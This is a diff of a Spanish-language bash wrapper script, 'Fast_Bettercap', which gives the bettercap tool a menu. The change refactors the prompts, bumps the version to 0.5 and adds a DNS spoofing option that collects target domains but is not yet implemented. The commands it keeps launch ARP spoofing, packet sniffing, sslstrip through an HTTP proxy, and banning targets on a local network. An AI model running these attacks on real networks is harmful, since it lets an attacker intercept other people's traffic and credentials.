@@ -1,7 +1,7 @@
 #!/bin/bash
 #Fast_Bettercap es un script en bash que busca simplificar el uso del nuevo bettercap para aquellas personas que no saben como utilizarla.
 #No busco robarme el crédito de esta maravillosa herramienta llamada BETTERCAP, simplemente facilitar su uso.
-#Esta es la version 0.2 y estoy re diseñando las funciones y menú de selección para hacerlo mas completo.
+#Esta es la version 0.5 y estoy re diseñando las funciones y menú de selección para hacerlo mas completo.
 #No soy un programador, ni me considero un hacker, solo soy un entusiasta de informatica.
 #Por si quieren contactarme: hablemosdehacking@gmail.com
 #Acepto sugerencias y criticas.
@@ -12,7 +12,7 @@
 BANNER() {
 	clear;echo;
 echo -e '\e[1;33m   -::-.`                                                   `...`     \e[0m'
-echo -e '\e[1;33m  .shhhhhhyo/-`           \e[1;37mFast Bettercap V0.2\e[1;33m          .:+syhhhhhs.  \e[0m'
+echo -e '\e[1;33m  .shhhhhhyo/-`           \e[1;37mFast Bettercap V0.5\e[1;33m          .:+syhhhhhs.  \e[0m'
 echo -e '\e[1;33m `yhhhhhhhhhhhys+-`         \e[1;37m By:> John-Wick\e[1;33m        .:+syhhhhhhhhhhhs;\e[0m'
 echo -e '\e[1;33m :hhhhhhhhhhhhhhhhhyo/-.                     `.:+oyhhhhhhhhhdhhhhhhh- \e[0m'
 echo -e '\e[1;33m +hhhhhh\e[1;37mMMMMNN\e[1;33mmdhhhhhhhhyso+/:--.......-:/+oyyhhhhhhhhdm\e[1;37mNMMMMM\e[1;33mmhhhhh/ \e[0m'
@@ -26,44 +26,60 @@ echo -e '\e[1;33m                                ``.```  \e[0m';echo;
 }
 
 DEPENDENCIAS() {
-clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.4 ]]]\e[0m";echo;sleep 0.5
+clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.5 ]]]\e[0m";echo;sleep 0.5
 if [ -f /root/bettercap.history ]; then
 	sudo rm /root/bettercap.history 2> /dev/null
 fi
 
 if ! hash bettercap 2>/dev/null; then
-		echo -e "\e[0;34m[[[\e[1;31mBetterap\e[0;34m]]]\e[0;37m No instalado.\e[0m";sleep 0.5
-		echo
-		exit=1
+		echo -e "\e[0;34m[[[\e[1;37mBettercap\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.5
+		exit
 	else
         echo -e "\e[0;34m[[[\e[1;37mBettercap\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.5
 fi
 
 if ! hash gnome-terminal 2>/dev/null; then
 		echo -e "\e[0;34m[[[\e[1;37mGnome-terminal\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.5
-		echo
-		exit=1 
+		exit
 	else
         echo -e "\e[0;34m[[[\e[1;37mGnome-terminal\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.5
 fi
 
 if ! hash netdiscover 2>/dev/null; then
 		echo -e "\e[0;34m[[[\e[1;37mNetdiscover\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.5
-		echo
-		exit=1 
+		exit 
 	else
         echo -e "\e[0;34m[[[\e[1;37mNetdiscover\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.5
 fi
 
 if ! hash nmap 2>/dev/null; then
 		echo -e "\e[0;34m[[[\e[1;37mNmap\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.5
-		echo
-		exit=1 
+		exit
 	else
         echo -e "\e[0;34m[[[\e[1;37mNmap\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.5
 fi
 
 MENU_PRINCIPAL
+}
+
+SAVECAPTURE() {
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+	read SINO
+	while [[ -z "$SINO" ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+		read SINO
+	done
+}
+
+FILEPATH() {
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+	read SALIDA_FAST_BETTERCAP
+		while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
+				echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+				read SALIDA_FAST_BETTERCAP
+		done
 }
 
 SET_TARGET() {
@@ -126,6 +142,37 @@ done
 }
 
 
+DNSSPOOF() {
+	SET_TARGET;
+	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede suplantar varios dominios separados por (,) Ejem: facebook.com,gmail.com \e[0m";
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que dominios desea suplantar:> \e[0m"; tput sgr0
+	read DOMAINOPCION
+		while [[ -z "$DOMAINOPCION"  ]]; do 
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
+				echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que dominios desea suplantar:> \e[0m"; tput sgr0
+				read DOMAINOPCION
+		done
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
+read IPDIRECTION
+while [[ -z "$IPDIRECTION" ]]; do
+	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m"
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
+	read IPDIRECTION
+done
+	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;32m DNS.SPOOF-ALL:\e[0;37m si es verdadero, el módulo responderá a cada solicitud DNS\e[0m"
+	echo -e "\e[0;37m de lo contrario, solo responderá a la que apunta a la PC local.\e[0m";
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Dns spoof all (falso/verdadero):> \e[0m"; tput sgr0
+	read SPOOFALL
+		while [[ -z "$SPOOFALL" || "$SPOOFALL" != @(falso|verdadero|) ]]; do
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio o no escribio bien (falso/verdadero)\e[0m"
+				echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Dns spoof all (falso/verdadero):> \e[0m"; tput sgr0
+				read SPOOFALL
+		done
+		echo -e "\e[0;31m "
+		read -p "Opcion en desarrollo, Enter para ir al menu principal.. "
+		MENU_PRINCIPAL
+}
+
 BAN_TARGET() {
 	SET_TARGET;
 	sleep 0.5 ;echo;
@@ -141,56 +188,25 @@ BAN_TARGET() {
 }
 
 SNIFFALL() { 				
-SET_TARGET														
-while true; do
-	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
-	read SINO
-	while [[ -z "$SINO" ]]; do
-		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
-		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
-		read SINO
-done
-
+SET_TARGET;SAVECAPTURE
 	 case $SINO in
-			[s]* ) echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-	 				read SALIDA_FAST_BETTERCAP
-					while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
-							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
-							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-							read SALIDA_FAST_BETTERCAP
-					done
-							gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
+			[s]* ) FILEPATH;
+					gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
 			;;
 			[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
 			;;	
 			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
 			;;
 	esac
-done
 }
 
 SNIFFTARGET() {
-	SET_TARGET
-	while true; do
-	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
-	read SINO
-	while [[ -z "$SINO" ]]; do
-		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
-		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
-		read SINO
-done
-
+	SET_TARGET;SAVECAPTURE;
 	 case $SINO in
-			[s]* ) echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-	 				read SALIDA_FAST_BETTERCAP
-					while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
-							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
-							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-							read SALIDA_FAST_BETTERCAP
-					done
-						echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 1: 192.168.1.2-4 (rango)\e[0m"
-						echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 2 192.168.1.3,192.168.1.5 (objetivos especificos)\e[0m";echo;
-						echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
+			[s]* ) 	FILEPATH;
+					echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 1: 192.168.1.2-4 (rango)\e[0m"
+					echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 2 192.168.1.3,192.168.1.5 (objetivos especificos)\e[0m";echo;
+					echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
 	 				read SNIFFTARGETOPCION
 					while [[ -z "$SNIFFTARGETOPCION"  ]]; do 
 							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio...\e[0m" 
@@ -205,7 +221,6 @@ done
 			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
 			;;
 	esac
-done
 }
 
 SSLSTRIPONOFF() {
@@ -220,27 +235,9 @@ SSLSTRIPONOFF() {
 
 
 HTTPPROXY() {
-SET_TARGET;
-while true; do
-		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no):> \e[0m"; tput sgr0
-		read SINO
-	while [[ -z "$SINO" ]]; do
-		echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio.\e[0m";
-		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no):> \e[0m"; tput sgr0
-		read SINO
-	done
-
+SET_TARGET;SAVECAPTURE;
 	 case $SINO in
-			[s]* ) echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura:> \e[0m"; tput sgr0
-	 				read HTTPPROXYOPCION
-					while [[ -z "$HTTPPROXYOPCION"  ]] || [[ ! -d "$HTTPPROXYOPCION" ]]; do 
-							echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
-							echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
-							read HTTPPROXYOPCION
-					done
-
-					SSLSTRIPONOFF
-
+			[s]* ) FILEPATH;SSLSTRIPONOFF
 							case $SSLTRIPOPCION in
 									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
 									;;
@@ -269,7 +266,6 @@ while true; do
 			* ) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
 			;;
 	esac
-done
 }
 
 SNIFF_MENU() {
@@ -303,7 +299,7 @@ echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Sniff (Snifear la red) \e[0m"
 echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Network devices (Dispositivos en la red )\e[0m"
 echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Ban target (Banear uno o mas objetivos)\e[0m"
 echo -e "\e[0;34m[[[\e[1;32m3. \e[0;34m]]]\e[0;37m Transparent HTTP proxy (Analizar el tráfico HTTP)\e[0m"
-echo -e "\e[0;34m[[[\e[1;32m4. \e[0;34m]]]\e[0;37m En desarrollo (XXXXXX)\e[0m"
+echo -e "\e[0;34m[[[\e[1;32m4. \e[0;34m]]]\e[0;37m DNS spoofing (Burlar al DNS)\e[0m"
 echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
 echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap:> \e[0m"; tput sgr0
 read MENUOPCION
@@ -322,7 +318,7 @@ done
 					;;
 					3) HTTPPROXY
 					;;
-					4) echo "en desarrollo 4";break
+					4) DNSSPOOF
 					;;
 					99) exit
 					;;
